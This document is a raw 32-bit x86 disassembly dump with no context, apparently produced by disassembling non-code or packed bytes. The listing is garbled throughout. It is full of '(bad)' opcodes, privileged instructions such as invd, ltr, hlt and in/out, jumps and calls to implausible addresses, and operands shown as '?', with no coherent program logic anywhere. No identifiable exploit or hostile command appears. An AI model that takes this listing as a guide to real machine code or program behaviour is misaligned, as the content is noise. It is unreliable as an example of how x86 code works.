  40fcf9:	xor    DWORD PTR [ebp-0x61],esi
  40fcfc:	mov    edi,DWORD PTR [eax+0xf19504]
  40fd02:	repnz mov DWORD PTR [ebp+0x20],ebx
  40fd06:	cmp    eax,DWORD PTR [ebp+0xf]
  40fd09:	test   DWORD PTR [edi+ecx*1-0x1],edx
  40fd0d:	fistp  WORD PTR [ebx+0x0]
  40fd10:	inc    ebp
  40fd11:	mov    ebx,DWORD PTR [edi+0xc]
  40fd14:	add    eax,eax
  40fd16:	inc    ebp
  40fd17:	test   BYTE PTR [ebx],dh
  40fd19:	add    eax,DWORD PTR [ebx]
  40fd1b:	add    BYTE PTR [esi+0x45],bl
  40fd1e:	ret    0x85
  40fd21:	jnp    0x544180f0
  40fd27:	inc    bp
  40fd29:	inc    ebp
  40fd2a:	xor    DWORD PTR [ecx+0xc78a9c],edi
  40fd30:	fdiv   QWORD PTR [ebx]
  40fd32:	test   DWORD PTR [ecx+0x453bf8],edi
  40fd38:	push   ebx
  40fd39:	add    edi,DWORD PTR [esi+0x708088b]
  40fd3f:	cmp    esi,eax
  40fd41:	setnp  BYTE PTR [ecx-0x74fcffce]
  40fd48:	mov    esp,edi
  40fd4a:	call   0x33cc429c
  40fd4f:	or     BYTE PTR [ebx],al
  40fd51:	inc    ecx
  40fd52:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  40fd58:	and    BYTE PTR [ebp-0x7074f0bb],al
  40fd5e:	lock add cl,al
  40fd61:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  40fd68:	mov    ch,0x45
  40fd6a:	clc    
  40fd6b:	xor    eax,DWORD PTR [ebp+0x3]
  40fd6e:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  40fd74:	inc    ebp
  40fd75:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  40fd7b:	mov    edi,eax
  40fd7d:	mov    eax,DWORD PTR [ebp+0x3c]
  40fd80:	mov    ecx,DWORD PTR [eax]
  40fd82:	hlt    
  40fd83:	inc    ebp
  40fd84:	ror    DWORD PTR [ebx+0x818c45],0xf4
  40fd8b:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  40fd91:	push   ebp
  40fd92:	mov    edi,DWORD PTR [ebx]
  40fd94:	in     al,dx
  40fd95:	jne    0x40fd58
  40fd97:	mov    eax,DWORD PTR [ebp-0x28]
  40fd9a:	add    DWORD PTR [eax],0xe8058dec
  40fda0:	clc    
  40fda1:	mov    esi,DWORD PTR [edi-0x8]
  40fda4:	add    dh,dl
  40fda6:	rol    WORD PTR [ebp-0x1],cl
  40fdaa:	mov    edx,DWORD PTR [eax+0x8]
  40fdad:	jne    0x40fd6f
  40fdaf:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  40fdb6:	inc    ebp
  40fdb7:	push   esp
  40fdb8:	test   DWORD PTR [ecx+0xf],ecx
  40fdbb:	sub    edx,esp
  40fdbd:	add    eax,DWORD PTR [eax]
  40fdbf:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  40fdc5:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  40fdcc:	mov    eax,DWORD PTR [ecx]
  40fdce:	and    BYTE PTR [eax],al
  40fdd0:	cmp    al,0x10
  40fdd2:	add    BYTE PTR [ebp+0x66],al
  40fdd5:	inc    ecx
  40fdd7:	push   esp
  40fdd8:	add    dh,BYTE PTR [ebp+0x0]
  40fddb:	push   edx
  40fddc:	enterw 0xc1,0x4d
  40fde1:	mov    esp,DWORD PTR [esi+0x20]
  40fde4:	add    DWORD PTR [ecx-0x7b],eax
  40fde7:	add    eax,DWORD PTR [ebx]
  40fde9:	str    WORD PTR [eax+0x45]
  40fded:	lea    ecx,[ebx+0x45890801]
  40fdf3:	sbb    BYTE PTR [ebx],al
  40fdf5:	dec    ebp
  40fdf6:	cmp    al,0xf
  40fdf8:	inc    ebp
  40fdf9:	push   eax
  40fdfa:	mov    esi,DWORD PTR [ebx]
  40fdfc:	push   eax
  40fdfd:	add    eax,eax
  40fdff:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  40fe06:	inc    ebp
  40fe07:	add    BYTE PTR [ecx],dh
  40fe09:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  40fe10:	(bad)  
  40fe11:	mov    ebx,eax
  40fe13:	loopne 0x40fe5a
  40fe15:	dec    ebp
  40fe16:	mov    ecx,DWORD PTR [edi]
  40fe18:	cld    
  40fe19:	push   eax
  40fe1a:	xchg   DWORD PTR [ebx],esi
  40fe1c:	add    DWORD PTR [ebx],ebp
  40fe1e:	add    BYTE PTR [ebx],ch
  40fe20:	or     BYTE PTR [ecx],bh
  40fe22:	dec    ecx
  40fe23:	loopne 0x40fe28
  40fe25:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  40fe2b:	push   ebp
  40fe2c:	add    DWORD PTR [ebx+0x55100800],eax
  40fe32:	dec    ebp
  40fe33:	jmp    0x40fdbe
  40fe35:	mov    esp,DWORD PTR [eax]
  40fe37:	sbb    dl,dl
  40fe39:	inc    eax
  40fe3a:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  40fe40:	add    BYTE PTR [ebx+0x74528555],cl
  40fe46:	push   ebp
  40fe47:	div    DWORD PTR [ebx]
  40fe49:	and    eax,DWORD PTR [ebx]
  40fe4b:	add    edx,DWORD PTR [edx-0x30]
  40fe4e:	jno    0x40fddb
  40fe50:	inc    DWORD PTR [eax+eiz*1]
  40fe53:	inc    ebp
  40fe54:	push   eax
  40fe55:	push   eax
  40fe56:	mov    esp,DWORD PTR [edi-0x74beff1c]
  40fe5c:	mov    edi,esp
  40fe5e:	push   eax
  40fe5f:	inc    ebp
  40fe60:	enter  0x458b,0x8
  40fe64:	push   ecx
  40fe65:	(bad)  
  40fe66:	call   0x10b083e
  40fe6b:	pop    ss
  40fe6c:	push   ebp
  40fe6d:	mov    ecx,DWORD PTR [ebx+0x489408]
  40fe73:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  40fe79:	push   ecx
  40fe7a:	jo     0x40fe64
  40fe7c:	inc    DWORD PTR [edi]
  40fe7e:	or     BYTE PTR [eax],al
  40fe80:	call   0xcc05ca
  40fe85:	fmul   QWORD PTR [ebp+0x55]
  40fe88:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  40fe8e:	mov    bh,0x8c
  40fe90:	adc    al,0x9b
  40fe92:	dec    esp
  40fe93:	xor    bl,BYTE PTR [eax]
  40fe95:	mov    ecx,DWORD PTR [ebp+0xc]
  40fe98:	mov    eax,DWORD PTR [ebp-0x4]
  40fe9b:	mov    esi,DWORD PTR [edi-0x3148f924]
  40fea1:	push   es
  40fea2:	retf   
  40fea3:	mov    BYTE PTR [ebp-0x30],0x3b
  40fea7:	inc    ebp
  40fea8:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  40feaf:	retf   0x83fc
  40feb2:	into   
  40feb3:	dec    ebp
  40feb4:	retf   
  40feb5:	mov    ecx,DWORD PTR [ebp-0x74]
  40feb8:	mov    eax,DWORD PTR [eax]
  40feba:	fdiv   QWORD PTR [ebx]
  40febc:	mov    bh,0x3
  40febe:	push   es
  40febf:	mov    esi,ecx
  40fec1:	sbb    cl,dl
  40fec3:	dec    ebp
  40fec4:	sar    DWORD PTR [ebx],cl
  40fec6:	push   ebp
  40fec7:	jne    0x40fed8
  40fec9:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  40fecf:	lea    ebx,[eax]
  40fed1:	call   0xf4ca8a98
  40fed6:	sbb    dh,dl
  40fed8:	add    edx,ebx
  40feda:	push   ebp
  40fedb:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  40fee1:	push   ecx
  40fee2:	mov    DWORD PTR [eax-0x30],edx
  40fee5:	test   DWORD PTR [edx],eax
  40fee7:	xadd   esp,esi
  40feea:	pop    es
  40feeb:	add    cl,dl
  40feed:	mov    eax,ecx
  40feef:	or     al,0x45
  40fef1:	(bad)  
  40fef2:	push   eax
  40fef3:	add    DWORD PTR [edx+0x0],eax
  40fef6:	add    ecx,DWORD PTR [ecx]
  40fef8:	and    dh,cl
  40fefa:	call   0xc507ca
  40feff:	add    DWORD PTR [ebp+0x0],edx
  40ff02:	mov    esp,DWORD PTR [ebp+0x18]
  40ff05:	add    BYTE PTR [eax+0x50],cl
  40ff08:	xor    eax,DWORD PTR [eax]
  40ff0a:	add    esp,DWORD PTR [esi+0x3b]
  40ff0d:	inc    ebp
  40ff0e:	je     0x40fe93
  40ff10:	push   ecx
  40ff11:	dec    BYTE PTR [ebp-0x77]
  40ff14:	add    eax,esi
  40ff16:	or     al,0x5e
  40ff18:	inc    eax
  40ff19:	add    BYTE PTR [ebx],al
  40ff1b:	data16 and BYTE PTR [ebp+0x50],al
  40ff1f:	sub    DWORD PTR [ecx],0xfffffff8
  40ff22:	add    BYTE PTR [ebp-0x75],ah
  40ff25:	add    BYTE PTR [eax],bl
  40ff27:	enter  0x894d,0x8b
  40ff2b:	int3   
  40ff2c:	loopne 0x40fef0
  40ff2e:	rol    BYTE PTR [eax],0x33
  40ff31:	lea    cx,[ebp+0xa]
  40ff35:	data16 jb 0x40ff7d
  40ff38:	add    BYTE PTR [ebx+0x44890855],cl
  40ff3e:	sbb    ah,al
  40ff40:	inc    ebp
  40ff41:	cmp    al,0xf
  40ff43:	add    BYTE PTR [edx+0x66],dl
  40ff46:	xor    ecx,DWORD PTR [eax]
  40ff48:	sub    eax,DWORD PTR [edx]
  40ff4a:	mov    eax,DWORD PTR [eax]
  40ff4c:	or     al,0x66
  40ff4e:	ror    edx,cl
  40ff50:	dec    ebp
  40ff51:	inc    ebp
  40ff52:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  40ff58:	cld    
  40ff59:	or     BYTE PTR [edi+0x4501dd],dl
  40ff5f:	ret    0xecce
  40ff62:	retf   
  40ff63:	(bad)  
  40ff64:	dec    ebp
  40ff65:	mov    al,0x8b
  40ff67:	loopne 0x40ff89
  40ff69:	cmp    ecx,DWORD PTR [edx]
  40ff6b:	inc    ebp
  40ff6c:	daa    
  40ff6d:	loopne 0x40fef6
  40ff6f:	in     al,dx
  40ff70:	add    edi,eax
  40ff72:	add    BYTE PTR [eax+0x3f52e155],bh
  40ff78:	push   ebp
  40ff79:	inc    ebp
  40ff7a:	xor    ebx,edx
  40ff7c:	add    ebp,esp
  40ff7e:	push   edx
  40ff7f:	push   bp
  40ff81:	inc    ebp
  40ff82:	(bad)  
  40ff83:	in     eax,dx
  40ff84:	push   esp
  40ff85:	(bad)  
  40ff86:	inc    edx
  40ff88:	sbb    al,0x33
  40ff8a:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  40ff91:	add    BYTE PTR [ebp+0x46],0x8b
  40ff95:	jmp    0xf98b:0x100041c8
  40ff9c:	xor    esi,DWORD PTR [edx+0x3]
  40ff9f:	mov    ecx,DWORD PTR [edi]
  40ffa1:	fmul   DWORD PTR [edx]
  40ffa3:	add    BYTE PTR [eax],al
  40ffa5:	lea    eax,[ebx-0x4700273c]
  40ffab:	add    al,0x4f
  40ffad:	pop    DWORD PTR [eax]
  40ffaf:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  40ffb5:	push   edx
  40ffb6:	inc    WORD PTR [ebp+0x8]
  40ffba:	mov    eax,0x514f4d
  40ffbf:	(bad)
  40ffc3:	add    al,al
  40ffc5:	xor    DWORD PTR [ebx-0x74baf730],eax
  40ffcb:	test   DWORD PTR [esi+0x74],esp
  40ffce:	inc    ebp
  40ffcf:	mov    DWORD PTR [eax+0xa4e08],edi
  40ffd5:	add    BYTE PTR [ecx-0x76c435bb],cl
  40ffdb:	or     dh,cl
  40ffdd:	or     eax,0x8b8d5045
  40ffe2:	inc    ebp
  40ffe3:	mov    WORD PTR [ecx+0x3b8a00],?
  40ffe9:	jne    0x41001e
  40ffeb:	mov    edi,DWORD PTR [edx+0x8f3b18]
  40fff1:	add    DWORD PTR [ebx],eax
  40fff3:	add    bh,bh
  40fff5:	adc    DWORD PTR [eax],ecx
  40fff7:	adc    DWORD PTR [ebp+0x55],edi
  40fffa:	push   es
  40fffb:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  410001:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  410008:	inc    ebp
  410009:	mov    esp,edi
  41000b:	or     al,0xda
  41000d:	push   eax
  41000e:	(bad)  
  41000f:	jne    0x40ffc5
  410011:	call   0x38f900
  410016:	inc    ebp
  410017:	sar    BYTE PTR [eax],0x84
  41001a:	in     al,dx
  41001b:	add    bh,al
  41001d:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  410024:	(bad)  
  410025:	and    al,al
  410027:	fs in  eax,dx
  410029:	inc    DWORD PTR [ebp-0x7b]
  41002c:	jle    0x41003d
  41002e:	leave  
  41002f:	scas   al,BYTE PTR es:[edi]
  410030:	inc    esp
  410031:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  410038:	or     BYTE PTR [ebx-0x97717c8],0x83
  41003f:	call   DWORD PTR [edi]
  410041:	shr    ah,0x84
  410044:	xchg   DWORD PTR [eax],eax
  410046:	add    DWORD PTR [eax],eax
  410048:	add    bh,bh
  41004a:	dec    ebp
  41004b:	and    BYTE PTR [ecx-0x38],dl
  41004e:	push   eax
  41004f:	dec    DWORD PTR [ebx+0xfd885]
  410055:	mov    BYTE PTR [ebp+0x508bac00],cl
  41005b:	mov    WORD PTR [ecx+0x0],ss
  41005e:	lea    ecx,[ebx+0x108b20d8]
  410064:	mov    WORD PTR [edx],ds
  410066:	add    BYTE PTR [edi+0xff01ff],al
  41006c:	mov    ecx,DWORD PTR [ebp-0x28]
  41006f:	push   ecx
  410070:	shl    BYTE PTR [ebp+0x3a],0x8b
  410074:	inc    ebp
  410075:	in     al,0xeb
  410077:	jno    0x410004
  410079:	push   edx
  41007a:	mov    DWORD PTR [eax-0x28],edx
  41007d:	mov    eax,DWORD PTR [ebp+0x20]
  410080:	je     0x410009
  410082:	mov    eax,DWORD PTR [ecx]
  410084:	sbb    BYTE PTR [eax],al
  410086:	pop    DWORD PTR [eax]
  410088:	add    esi,eax
  41008a:	add    bl,al
  41008c:	adc    DWORD PTR [edi],esi
  41008e:	jmp    0x8bcc50e0
  410093:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  41009a:	jne    0x410027
  41009c:	mov    ecx,DWORD PTR [eax]
  41009e:	in     al,0x75
  4100a0:	pop    DWORD PTR [ecx+0x5401]
  4100a6:	push   edx
  4100a7:	inc    DWORD PTR [ebx]
  4100a9:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4100af:	add    BYTE PTR [edi+0x9],dl
  4100b2:	call   DWORD PTR [esi]
  4100b4:	and    dl,al
  4100b6:	and    bh,bh
  4100b8:	inc    edi
  4100ba:	test   eax,edx
  4100bc:	sldt   ebx
  4100bf:	xor    al,BYTE PTR [eax]
  4100c1:	pushf  
  4100c2:	(bad)  
  4100c3:	jmp    0x4100d1
  4100c5:	mov    eax,edi
  4100c7:	or     al,0x75
  4100c9:	inc    eax
  4100ca:	call   0x40f7d2
  4100cf:	mov    eax,eax
  4100d1:	loopne 0x410057
  4100d3:	inc    ebp
  4100d4:	add    BYTE PTR [ebx+0x1451c00],cl
  4100da:	mov    eax,DWORD PTR [ebp+0x20]
  4100dd:	add    edi,ecx
  4100df:	add    BYTE PTR [eax],ch
  4100e1:	cmp    edi,0x18
  4100e4:	test   DWORD PTR [ebp+0xf],esi
  4100e7:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4100ee:	jne    0x4100f2
  4100f0:	call   0xff9ffbb5
  4100f5:	leave  
  4100f6:	rcr    BYTE PTR [esp+eax*4],0x55
  4100fa:	add    ah,ch
  4100fc:	add    BYTE PTR [edi-0x48fef979],dh
  410102:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  410109:	inc    esp
  41010a:	mov    ebx,DWORD PTR [eax]
  41010c:	fcom   st(2)
  41010e:	add    BYTE PTR [edi],bl
  410110:	lea    ecx,[eax-0x18]
  410113:	(bad)  
  410114:	push   DWORD PTR [ecx]
  410116:	call   0xffb34e78
  41011b:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  41011f:	fstp   DWORD PTR [esi+ebx*8]
  410122:	push   ebp
  410123:	pop    ebp
  410124:	mov    esi,DWORD PTR [edx-0x38]
  410127:	add    DWORD PTR [eax],0x28
  41012a:	mov    edi,DWORD PTR [ebx]
  41012c:	xor    esi,DWORD PTR [edx+0x3]
  41012f:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  410133:	pop    ebp
  410134:	or     al,0x4
  410136:	inc    ecx
  410137:	push   ebp
  410138:	(bad)  
  410139:	in     al,dx
  41013a:	or     ah,ch
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	xbegin 0xffc67733
  410143:	clc    
  410144:	adc    al,0x45
  410146:	div    BYTE PTR [edx]
  410148:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  41014f:	test   DWORD PTR [ebx+0x666300f8],ebx
  410155:	add    BYTE PTR [ecx+0x66],dh
  410158:	add    eax,DWORD PTR [ebp+0x52]
  41015b:	adc    eax,0xffffffa0
  41015e:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  410164:	test   DWORD PTR [eax],eax
  410166:	clc    
  410167:	data16 or al,BYTE PTR [ebp+0x45]
  41016b:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  410172:	rol    BYTE PTR [ebp+0x45],1
  410175:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  41017b:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  410181:	push   ebx
  410182:	add    BYTE PTR [eax+eax*1+0x51],dl
  410186:	jge    0x4101bb
  410188:	add    BYTE PTR [esi+0x4],dl
  41018b:	jne    0x4101f2
  41018d:	mov    edx,0x457200
  410192:	jmp    0x410156
  410194:	xor    edi,DWORD PTR [ebx]
  410196:	pop    edi
  410197:	cvtdq2ps xmm7,xmm0
  41019a:	ret    0x0
  41019d:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4101a3:	xor    ecx,DWORD PTR [edi]
  4101a5:	add    eax,DWORD PTR [ecx+0x3b]
  4101a8:	push   ebx
  4101a9:	rdpmc  
  4101ab:	out    0x8d,al
  4101ad:	add    BYTE PTR [eax],cl
  4101af:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4101b5:	ret    0x450c
  4101b8:	sbb    al,0x8b
  4101ba:	cmp    eax,esi
  4101bc:	or     cl,al
  4101be:	or     al,0xc2
  4101c0:	pop    eax
  4101c1:	inc    ebp
  4101c2:	add    ecx,DWORD PTR [edi]
  4101c4:	add    esi,DWORD PTR [ebp+0x39]
  4101c7:	invd   
  4101c9:	jge    0x4101d5
  4101cb:	mov    eax,0x478ac0
  4101d0:	cli    
  4101d1:	xor    esp,ecx
  4101d3:	mov    ebx,0x5b8ac0
  4101d8:	ret    0x33
  4101db:	mov    eax,0x833b8b
  4101e0:	sub    BYTE PTR [ebx],al
  4101e2:	inc    ebp
  4101e3:	xor    ax,di
  4101e6:	pushf  
  4101e7:	inc    bh
  4101e9:	mov    esp,esp
  4101eb:	hlt    
  4101ec:	test   DWORD PTR [ebp-0x8],esi
  4101ef:	mov    eax,DWORD PTR [ebp-0x14]
  4101f2:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4101f8:	dec    edi
  4101f9:	or     BYTE PTR [eax],al
  4101fb:	jne    0x410186
  4101fd:	mov    esi,esp
  4101ff:	call   0x77a78dc4
  410204:	inc    ebp
  410205:	mov    DWORD PTR [eax+0x9b4f0c],edi
  41020b:	add    BYTE PTR [ecx-0x3ffe0717],cl
  410211:	add    BYTE PTR [esi+0x7d],ah
  410214:	inc    ebp
  410215:	mov    bx,WORD PTR [ebp+0x8]
  410219:	add    DWORD PTR [ebp+0x54],0x30c008b
  410220:	inc    ebp
  410221:	mov    bx,di
  410224:	lock test BYTE PTR [ecx+0x7000801],bh
  41022b:	jge    0x4101ee
  41022d:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  410233:	cli    
  410234:	xor    bl,bh
  410236:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  41023c:	test   BYTE PTR [eax],cl
  41023e:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  410245:	cmp    ebp,eax
  410247:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  41024e:	test   BYTE PTR [ebp+0x1],bh
  410251:	mov    ebx,0x458a00
  410256:	xor    esi,DWORD PTR [ebx]
  410258:	add    esp,DWORD PTR [esi-0x77]
  41025b:	pop    ebp
  41025c:	loopne 0x4102c4
  41025e:	inc    ebp
  41025f:	clc    
  410260:	xor    edi,DWORD PTR [ebx]
  410262:	add    esi,DWORD PTR [edx-0x77]
  410265:	data16 fdivr QWORD PTR [ebp-0x49]
  410269:	mov    ebx,0xb78afc
  41026e:	hlt    
  41026f:	xor    edi,DWORD PTR [esi+eiz*2]
  410272:	add    BYTE PTR [ebp+0x66],bl
  410275:	data16 lock clc 
  410278:	cmp    al,0x3b
  41027a:	add    BYTE PTR [edi+0x66],dh
  41027d:	psubq  mm7,QWORD PTR [ebp+0x2]
  410281:	ltr    WORD PTR [ebp+0x66]
  410285:	add    esi,eax
  410287:	add    di,WORD PTR [ebp+0x2b]
  41028b:	data16 data16 jge 0x41030c
  41028f:	mov    ebx,0xe08a8b
  410294:	jge    0x4102c9
  410296:	data16 data16 xor al,0x5d
  41029a:	data16 data16 jne 0x410296
  41029e:	mov    edi,DWORD PTR [ebx]
  4102a0:	fdiv   QWORD PTR [edx+0x7d]
  4102a3:	data16 data16 jge 0x4102db
  4102a7:	mov    ebx,0x758a66
  4102ac:	mov    esi,0x667233
  4102b1:	pop    ebp
  4102b2:	or     BYTE PTR [esi+0x0],ah
  4102b5:	clc    
  4102b6:	mov    edi,DWORD PTR [ebx]
  4102b8:	lock ja 0x410246
  4102bb:	(bad)  
  4102bd:	jge    0x4102b6
  4102bf:	invd   
  4102c1:	pop    ebp
  4102c2:	add    BYTE PTR [ebx],al
  4102c4:	(bad)  
  4102c5:	cmp    di,WORD PTR [ebp+0xf]
  4102c9:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4102cd:	mov    bx,WORD PTR [ebp-0x10]
  4102d1:	pop    bp
  4102d3:	fbstp  TBYTE PTR [ebx]
  4102d5:	test   DWORD PTR [ebx],eax
  4102d7:	add    BYTE PTR [ebx],bh
  4102d9:	add    BYTE PTR [esi+0x7d],ah
  4102dc:	jge    0x410269
  4102de:	data16 in al,dx
  4102e0:	pop    ebp
  4102e1:	stc    
  4102e2:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4102e9:	mov    edi,ebx
  4102eb:	in     al,dx
  4102ec:	test   BYTE PTR [ebp+0x0],bh
  4102ef:	mov    eax,DWORD PTR [eax]
  4102f1:	call   0xbd3dfc81
  4102f6:	cmp    al,0x9b
  4102f8:	add    BYTE PTR [edx],dh
  4102fa:	mov    bx,di
  4102fd:	call   0x8b49808d
  410302:	add    ebp,esp
  410304:	mov    bx,di
  410307:	jnp    0x41032f
  410309:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  41030f:	mov    eax,DWORD PTR [eax]
  410311:	call   0x7c3c8e7c
  410316:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41031c:	data16 data16 fistp WORD PTR [ebp+0xe]
  410321:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  41032b:	fisttp WORD PTR [ecx-0x7401f77b]
  410331:	(bad)  
  410332:	cld    
  410333:	jne    0x410371
  410335:	xor    eax,DWORD PTR [eax]
  410337:	mov    esp,DWORD PTR [esi-0x10]
  41033a:	sti    
  41033b:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  410342:	data16 adc bl,bh
  410345:	push   ebp
  410346:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  41034d:	mov    WORD PTR [eax],es
  41034f:	fwait
  410350:	data16 xor bh,bl
  410353:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  410359:	mov    esp,DWORD PTR [esi-0x14]
  41035c:	fisttp WORD PTR [ebx-0x3748a9f2]
  410362:	or     al,0x2b
  410364:	mov    bh,0xba
  410366:	hlt    
  410367:	mov    bh,bl
  410369:	add    BYTE PTR [ecx-0x7446f3cd],cl
  41036f:	dec    esi
  410370:	or     al,0x0
  410372:	mov    edi,DWORD PTR [ebx]
  410374:	or     BYTE PTR [ebp+0x3b],dh
  410377:	mov    ecx,DWORD PTR [edi]
  410379:	fdivr  QWORD PTR [ebx-0x7499ff83]
  41037f:	xor    al,0xd8
  410381:	pop    bp
  410383:	lock xor esi,DWORD PTR [ebx]
  410386:	lea    esp,[esi+0x1f]
  410389:	icebp  
  41038a:	jb     0x410390
  41038c:	add    al,al
  41038e:	jge    0x41039c
  410390:	mov    eax,eax
  410392:	fsubr  st,st(3)
  410394:	pop    ebp
  410395:	mov    esi,DWORD PTR [ebx]
  410397:	in     al,0x8d
  410399:	rcr    DWORD PTR [edi],0xc2
  41039c:	jb     0x4103fc
  41039e:	add    cl,cl
  4103a0:	jge    0x4103ae
  4103a2:	mov    edx,DWORD PTR [ebp-0x20]
  4103a5:	in     al,dx
  4103a6:	pop    ebp
  4103a7:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4103ac:	cmp    di,WORD PTR [ebp+0x0]
  4103b0:	mov    ebp,DWORD PTR [ebx]
  4103b2:	fdivr  QWORD PTR [esi+0x668a5d]
  4103b8:	cmp    al,0x33
  4103ba:	mov    si,0x4e7d
  4103be:	mov    eax,DWORD PTR [eax]
  4103c0:	lock inc ebp
  4103c2:	mov    esi,DWORD PTR [eax]
  4103c4:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4103cb:	clc    
  4103cc:	(bad)  
  4103cd:	cmp    edi,DWORD PTR [ebx]
  4103cf:	je     0x4103e0
  4103d1:	push   ebx
  4103d2:	loopne 0x4103e3
  4103d4:	dec    ecx
  4103d6:	mov    esp,DWORD PTR [ebp-0x1c]
  4103d9:	int    0xf1
  4103db:	mov    esi,0x703084d
  4103e0:	pcmpgtd mm6,mm1
  4103e3:	add    BYTE PTR [ebp+0x66],dh
  4103e6:	jmp    0x4103b3
  4103e8:	mov    eax,DWORD PTR [ebx]
  4103ea:	lock push ebp
  4103ec:	ror    DWORD PTR [ebp-0x2972feb3],1
  4103f2:	or     bh,dl
  4103f4:	jb     0x4103f4
  4103f6:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4103fc:	loopne 0x4103fe
  4103fe:	jne    0x410402
  410400:	data16 add BYTE PTR [esi+eiz*2],dh
  410404:	mov    ecx,ebx
  410406:	data16 cmp al,0xf1
  410409:	add    BYTE PTR [esi+eiz*2],bh
  41040c:	add    bl,cl
  41040e:	retw   0xf2
  410412:	ret    0x66
  410415:	retf   
  410416:	enterw 0x4df1,0x19
  41041b:	pop    edi
  41041c:	jne    0x41039f
  41041e:	mov    esi,DWORD PTR [eax]
  410420:	call   0x77b58fc1
  410425:	xor    ebp,DWORD PTR [ebx]
  410427:	lea    esp,[esi+0x48]
  41042a:	repnz in eax,0x3b
  41042d:	add    BYTE PTR [ebp-0x37],dh
  410430:	xor    edx,DWORD PTR [ebp-0x15]
  410433:	in     al,dx
  410434:	xor    edx,DWORD PTR [esi+0x40]
  410437:	mov    DWORD PTR [edi],0x338545fc
  41043d:	clc    
  41043e:	add    esi,DWORD PTR [ecx]
  410440:	pop    edi
  410441:	pushf  
  410442:	pop    ebx
  410443:	call   0xff42040a
  410448:	mov    edi,eax
  41044a:	push   ecx
  41044b:	pop    es
  41044c:	mov    edi,DWORD PTR [eax]
  41044e:	push   esi
  41044f:	inc    esi
  410450:	add    bh,BYTE PTR [esi+0x0]
  410453:	popa   
  410454:	data16 (bad) 
  410456:	into   
  410457:	gs cmp al,0xcd
  41045a:	add    BYTE PTR [ecx+0x7ce0866],bh
  410460:	ret    0x66
  410463:	add    bh,al
  410465:	add    bh,ah
  410467:	add    BYTE PTR [ebp+0x31c3f866],al
  41046d:	cmp    al,0x9c
  41046f:	add    BYTE PTR [esi+0x66],ah
  410472:	into   
  410473:	ret    
  410474:	pop    ebp
  410475:	adc    BYTE PTR [edi+0x0],dl
  410478:	mov    bh,0x66
  41047a:	mov    edi,0xff038dc3
  41047f:	jne    0x4104d5
  410481:	lea    edx,[ecx+0x1]
  410484:	mov    ebx,0xd64ff1
  410489:	sar    DWORD PTR [ebx],1
  41048b:	test   BYTE PTR [ebp+0x36],dh
  41048e:	mov    DWORD PTR [esp+edi*8-0x76],esp
  410492:	push   edi
  410493:	xor    BYTE PTR [ebx],0x38
  410496:	mov    esi,ebx
  410498:	xor    eax,DWORD PTR [eax-0x3c73819a]
  41049e:	ss inc ebp
  4104a0:	fs pop ebx
  4104a2:	mov    ebx,0x9c3b30
  4104a7:	je     0x4104d4
  4104a9:	xor    edi,DWORD PTR [ebx+0x668a33]
  4104af:	mov    WORD PTR [ebx],?
  4104b1:	ss mov ebx,0x8b4e64
  4104b7:	pop    edi
  4104b8:	cmp    ecx,ecx
  4104ba:	jne    0x410511
  4104bc:	mov    ebp,esp
  4104be:	cld    
  4104bf:	push   esi
  4104c0:	pop    ebx
  4104c1:	inc    ebp
  4104c2:	stc    
  4104c3:	xor    BYTE PTR [ebp+0x9bef89c],al
  4104c9:	test   esi,ecx
  4104cb:	clc    
  4104cc:	test   dl,dl
  4104ce:	cmp    bh,bh
  4104d0:	fs pop si
  4104d3:	or     bl,al
  4104d5:	add    cl,BYTE PTR [ebx+0x57665100]
  4104db:	retf   0x3c45
  4104de:	xor    BYTE PTR [eax],al
  4104e0:	pushf  
  4104e1:	mov    si,0x85ca
